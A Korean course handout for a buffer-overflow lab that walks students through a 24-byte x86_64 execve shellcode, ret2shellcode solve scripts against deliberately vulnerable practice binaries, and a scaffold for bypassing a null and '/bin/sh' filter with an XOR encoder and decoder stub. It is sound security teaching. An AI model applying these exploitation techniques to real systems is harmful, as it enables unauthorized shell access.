# 4주차 실습 안내서 — BOF with Shellcode & Filter Bypass

> 이 문서는 **어디서·어떤 명령으로 빌드하고 실행하는지**, 각 단계를 **어떻게 분석·접근하는지**를 안내합니다.
> Main/Hidden의 완성된 정답 페이로드(오프셋·디코더 스텁)는 담고 있지 않습니다. 값은 여러분이 직접 분석해 채워 넣으세요.

---

## 0. 실행 환경 (가장 중요 — 쉘코드는 CPU 아키텍처를 탄다)

- 쉘코드는 **CPU 명령어(기계어) 그 자체**입니다. x86_64용 24바이트 쉘코드는 **arm64(애플 실리콘)에서 절대 동작하지 않습니다.**
- ⚠️ **맥에서 그냥 `gcc`/`make` 하면 안 됩니다.** 애플 실리콘은 arm64, 게다가 리눅스 ELF가 아니라 **Mach-O**가 만들어져 `-z execstack`조차 무시됩니다. 교안의 바이트·오프셋이 전혀 맞지 않습니다.
- **채점 대상 Level 3**는 compose에 `platform: linux/amd64` 가 지정돼 있어 **어느 OS에서도 동일하게** 동작합니다(걱정 불필요).

**Level 1·2를 어느 OS에서든 동일하게 amd64로 빌드하는 방법 (아래 중 하나):**

1. **SEED 2.0 VM(Ubuntu 22.04) 또는 Windows WSL2(Ubuntu)** 안에서 그대로 `make` — `gdb`/`checksec`이 이미 있어 가장 편합니다.
2. **VM이 없으면 amd64 컨테이너 한 줄** — Mac·Windows·Linux 어디서든 결과가 동일합니다:
   ```bash
   # 03_bof_shellcode 폴더에서 실행 (실습 런타임과 동일한 ubuntu:22.04)
   docker run --rm -it --platform linux/amd64 -v "$PWD":/w -w /w ubuntu:22.04 bash
   # ↓ 컨테이너 안에서 (최초 1회):
   apt update && apt install -y gcc gdb make python3 file
   cd level1_intro && make && ./shellcode_intro     # Level 1
   cd ../level2_basic && make && ./shellcode_basic   # Level 2
   ```
   > 매번 재설치가 싫으면 `--rm`을 빼고 `--name scdbg`를 붙여 실행한 뒤, 다음부터는 `docker start -ai scdbg`로 재접속하세요.

빌드 전 환경 확인:
```bash
uname -m           # x86_64 여야 함 (aarch64/arm64면 위 컨테이너 사용)
file ./shellcode_intro   # "ELF 64-bit ... x86-64" 여야 정상 (Mach-O면 환경 잘못됨)
```

---

## 1. 권장 학습 순서

1. **Level 1 (`shellcode_intro`)** — 버퍼에 넣은 기계어가 **함수 포인터로 바로 실행**되는 현상 관찰
2. **Level 2 (`shellcode_basic`)** — 스택 오버플로우로 **RET를 버퍼로** 돌려 쉘코드 실행 (ret2shellcode)
3. **Level 3 Main (`echo_sandbox` Mode 1)** — 원격 서비스에서 동일 기법으로 셸 획득 → 채점 대상
4. **Level 3 Hidden (`echo_sandbox` Mode 2)** — **널·`/bin/sh` 필터**를 인코딩+자체복호화로 우회 → 채점 대상(심화)

> 채점 대상은 **Level 3 Main/Hidden** 입니다. Level 1·2는 로컬 연습(참여 점수).

---

## 2. 쉘코드 기초 — 24바이트 execve

64비트 리눅스에서 `/bin/sh` 셸을 띄우는 표준 쉘코드는 24바이트입니다.

```assembly
xor  rsi, rsi                    ; 48 31 f6   rsi = NULL (argv)
push rsi                         ; 56
movabs rdi, 0x68732f2f6e69622f   ; 48 bf ...  '/bin//sh'
push rdi                         ; 57
mov  rdi, rsp                    ; 48 89 e7   rdi = "/bin//sh"
xor  rdx, rdx                    ; 48 31 d2   rdx = NULL (envp)
mov  al, 59                      ; b0 3b      rax = 59 (sys_execve)
syscall                          ; 0f 05
```
- 각 줄이 **왜 그 기계어 바이트가 되는지**를 보고서에 매핑하세요(핵심 채점 항목).
- 직접 어셈블해 보려면: `nasm`으로 작성 후 `objdump -d`, 또는 pwntools `asm(shellcraft.amd64.linux.sh())`.

---

## 3. Level 1 — `shellcode_intro` (로컬 연습)

```bash
cd 03_bof_shellcode/level1_intro
make            # flag.txt 자동 생성
./shellcode_intro
```
- 프로그램이 버퍼 주소를 출력하고, 입력한 바이트를 `((void(*)())buf)()` 로 **곧바로 실행**합니다.
- ⚠️ **중요**: `read()` 는 한 번에 들어온 입력을 통째로 읽어갑니다. 셸코드와 `cat flag.txt` 를 **동시에** 보내면 둘 다 버퍼로 들어가 셸에 명령이 전달되지 않습니다. **셸코드를 먼저 보내고 잠깐(0.3s) 기다린 뒤** 명령을 보내세요(또는 `(payload; cat) | ./prog` 로 셸을 대화형 연결).

```python
# solve_level1.py  (추가 설치 불필요)
import subprocess, time
sc = b"...24B execve..."                 # 2장 참고해 직접 작성
p = subprocess.Popen(["./shellcode_intro"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE)
p.stdin.write(sc); p.stdin.flush()       # 1) 셸코드만 전송
time.sleep(0.3)                          # 2) read()가 셸코드만 소비하도록 간격
p.stdin.write(b"cat flag.txt\nexit\n"); p.stdin.flush(); p.stdin.close()  # 3) 셸에 명령
print(p.stdout.read().decode(errors="ignore"))
# → FLAG{shellcode_intro_practice}
```

---

## 4. Level 2 — `shellcode_basic` (로컬 연습, ret2shellcode)

```bash
cd 03_bof_shellcode/level2_basic
make
./shellcode_basic
```
- `vuln()` 안 `char buf[64]`, `read(0, buf, 128)`. 버퍼를 넘겨 **RET**를 `buf` 시작 주소로 덮습니다.
- 오프셋 = `버퍼 크기 + Saved RBP(8)`. 정확한 값은 `gdb`의 `disas vuln`에서 `buf`의 `lea -0x??(%rbp)` 로 **직접 계산**하세요.
- 페이로드: `[ 쉘코드 24B ] + [ NOP 패딩 ] + [ 유출된 buf 주소 (p64) ]`.
- ⚠️ **ASLR 주의**: 스택 주소는 실행할 때마다 달라집니다. 반드시 **같은 실행(프로세스)** 에서 출력된 buf 주소를 파싱해 그 즉시 페이로드를 보내세요(별도로 실행해 얻은 주소는 무효). Level 1처럼 페이로드 전송 후 **0.3s 간격**을 두고 `cat flag.txt` 를 보냅니다.

```python
# solve_level2.py  (추가 설치 불필요)
import subprocess, struct, time, re, os, fcntl
sc = b"...24B execve..."
p = subprocess.Popen(["./shellcode_basic"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE)
fl = fcntl.fcntl(p.stdout, fcntl.F_GETFL)                 # 논블로킹 읽기
fcntl.fcntl(p.stdout, fcntl.F_SETFL, fl | os.O_NONBLOCK)
time.sleep(0.3); banner = p.stdout.read() or b""          # 같은 프로세스에서 주소 릭
addr = int(re.search(rb"Stack Buffer Address\s*:\s*(0x[0-9a-f]+)", banner).group(1), 16)
payload = sc + b"\x90"*(72 - len(sc)) + struct.pack("<Q", addr)   # 72 = gdb로 도출
p.stdin.write(payload); p.stdin.flush(); time.sleep(0.3)
p.stdin.write(b"cat flag.txt\nexit\n"); p.stdin.flush(); p.stdin.close()
time.sleep(0.3); print((p.stdout.read() or b"").decode(errors="ignore"))
# → FLAG{shellcode_basic_practice}
```
> 컴파일 시 `warning: 'read' writing 128 bytes ... overflows` 경고는 **의도된 오버플로우**라 정상입니다(무시).

---

## 5. Level 3 Main — `echo_sandbox` Mode 1 (원격, 채점)

```bash
cp .env.example .env           # STUDENT_ID 를 '본인 학번'으로 수정
docker compose up -d --build
nc localhost 9002              # 메뉴에서 1 = Classic Mode 선택
```

### 5.1 네트워크 수신 보일러플레이트 (제공)
서버가 데이터를 여러 조각으로 보내므로, 프롬프트가 도착할 때까지 누적 수신하세요(네트워크 디버깅은 이 과제 목표가 아님).
```python
import socket, struct, re
HOST, PORT = "127.0.0.1", 9002
def p64(v): return struct.pack("<Q", v)

def recv_until(sock, markers, timeout=3.0):
    if isinstance(markers, (str, bytes)): markers = [markers]
    markers = [m.encode() if isinstance(m, str) else m for m in markers]
    sock.settimeout(timeout); buf = b""
    while not any(m in buf for m in markers):
        try: chunk = sock.recv(4096)
        except socket.timeout: break
        if not chunk: break
        buf += chunk
    return buf

s = socket.socket(); s.connect((HOST, PORT))
recv_until(s, "Choice >"); s.sendall(b"1\n")
leak = recv_until(s, "payload >").decode(errors="ignore"); print(leak)
buf_addr = int(re.search(r"Target Stack Buffer Address\s*:\s*(0x[0-9a-fA-F]+)", leak).group(1), 16)
```

### 5.2 페이로드 스캐폴드 (오프셋은 직접 구하기)
```python
shellcode = b"...24B execve..."           # 2장 참고해 직접 작성
offset    = ____                          # TODO: gdb/objdump로 buf@rbp-0x?? 확인 후 +8
payload   = shellcode + b"\x90" * (offset - len(shellcode)) + p64(buf_addr)
s.sendall(payload)                        # Mode 1은 read() → 널 포함 OK
import time; time.sleep(0.3)              # ★ 간격: read()가 payload만 소비하도록
s.sendall(b"cat /home/pwn/flag_main.txt\n")
print(recv_until(s, ["FLAG{"], 2).decode(errors="ignore"))
```

---

## 6. Level 3 Hidden — `echo_sandbox` Mode 2 (원격, 채점 · 심화)

- 메뉴 **2 = Restricted Filter Sandbox**. 필터: `\x00`(널)·`/bin/sh` 평문 포함 시 **즉시 차단**.
- 이 모드는 필터 통과 시 `buf`를 **직접 call** 합니다 → RET 오프셋이 필요 없습니다. **관건은 널·평문 없는 쉘코드**.
- 전략(원리만): ① 24B 쉘코드를 어떤 키로 **인코딩**(예: XOR)해 널·평문을 없애고, ② 앞단에 **런타임 자체 복호화 디코더 스텁**을 붙여 실행합니다.
- ⚠️ 힌트: 스택 **절대주소**를 스텁에 임베드하는 방식(`mov reg, addr` / `not`)은 주소의 바이트 경계에서 **널이 다시 생겨** 필터에 걸리기 쉽습니다. 절대주소를 쓰지 않는 방법을 고민해 보세요.

```python
raw = b"...24B execve..."
enc = bytes([b ^ 0xKEY for b in raw])     # TODO: 널·평문이 사라지는 키 선택
stub = b"...런타임 복호화 디코더..."       # TODO: 직접 설계 (널 프리)
payload = stub + enc
assert b"\x00" not in payload             # 스스로 검증
# Mode 2 선택 후 payload 전송 → time.sleep(0.3) → cat /home/pwn/flag_hidden.txt
#  (Main과 동일하게, 셸코드 실행 후 셸에 명령을 보낼 때 0.3s 간격 필수)
```

---

## 7. GDB / 분석 빠른 참조

```text
gdb -q ./shellcode_basic
(gdb) disas vuln                 # 버퍼 위치(lea -0x??(%rbp)) 확인 → 오프셋 도출
(gdb) b *vuln+<read 이후>
(gdb) run
(gdb) x/16gx $rsp                # 스택 덤프
(gdb) i r rsp rbp
checksec --file=./echo_sandbox   # NX/Canary/PIE 확인 (NX disabled = execstack)
objdump -d ./echo_sandbox | grep -A2 mode_1_classic_shellcode   # buf 배치 확인
```

---

## 8. 보고서 & 채점

- **플래그 문자열만 제출하면 0점.** 다음을 반드시 서술:
  1. 24B 쉘코드의 **어셈블리 ↔ 기계어 바이트 매핑**
  2. 오프셋을 **어떤 주소 차이/디스어셈블**로 구했는가 (gdb 캡처 근거)
  3. Hidden: 어떤 인코딩·디코더로 필터를 통과시켰는가 (널 프리 근거)
- Main/Hidden은 **본인이 작성한 solve 스크립트 + 취약점 분석 보고서**로 채점합니다.
- 배점: Level 3 **Main 60% / Hidden 40%** (Level 1·2는 참여 점수).
- **본인 학번(STUDENT_ID) 플래그만 유효.** 타인 플래그·`docker exec`(root)·오프라인 계산 값 제출은 부정행위로 기록됩니다.

---

## 9. 자주 겪는 문제

| 증상 | 원인 | 해결 |
| --- | --- | --- |
| 쉘코드 실행 시 Segfault | 맥 네이티브 빌드(arm64/Mach-O), 또는 NX 켜짐 | amd64 컨테이너/SEED VM에서 빌드(0장), `checksec`로 NX disabled 확인 |
| 오프셋이 교안과 다름 | 빌드 환경/최적화 차이 | 본인 바이너리에서 `gdb`/`objdump`로 직접 도출 (하드코딩 금지) |
| "주소 파싱 실패" | 서버 응답을 한 번에 못 받음 | `recv_until()`로 프롬프트까지 누적 수신 |
| Mode 2에서 즉시 거부 | 페이로드에 `\x00` 또는 `/bin/sh` 존재 | 인코딩 + 자체복호화, 전송 전 `assert b"\x00" not in payload` |
| 셸은 떴는데 `cat flag.txt` 결과가 안 나옴 | 셸코드+명령을 한 번에 보내 `read()`가 명령까지 삼킴 | 셸코드 전송 후 **0.3s 간격** 두고 명령 전송 (위 solve 예시) |
| Level 2 주소는 맞는데 실패 | ASLR로 매 실행마다 스택 주소 상이 | 별도 실행 금지, **같은 프로세스**에서 출력된 주소를 즉시 사용 |
| `file`/`checksec` 명령 없음 | 컨테이너에 미설치 | `apt install -y file` (checksec는 선택: `apt install -y checksec` 또는 gdb-gef) |
| `docker compose up` 포트 오류 | 9002 포트 사용 중 | 기존 컨테이너 종료 `docker compose down` 후 재시도, 또는 점유 프로세스 종료 |
| 플래그가 `_default_` | `.env`의 STUDENT_ID 미설정 | `.env`에 본인 학번 설정 후 `--build` 재실행 |

---

## 10. 참고 자료 (링크)

- 쉘코드 데이터베이스 (shell-storm): http://shell-storm.org/shellcode/
- Exploit-DB Shellcodes: https://www.exploit-db.com/shellcodes
- pwntools shellcraft (amd64): https://docs.pwntools.com/en/stable/shellcraft/amd64.html
- Linux x86_64 syscall 표: https://x64.syscall.sh/
- Smashing the Stack for Fun and Profit (Phrack 49-14): http://phrack.org/issues/49/14.html
- ret2shellcode 개념 정리 (CTF101): https://ctf101.org/binary-exploitation/what-is-a-buffer-overflow/
- GEF (gdb 확장): https://github.com/hugsy/gef
- LiveOverflow Binary Exploitation 시리즈: https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN
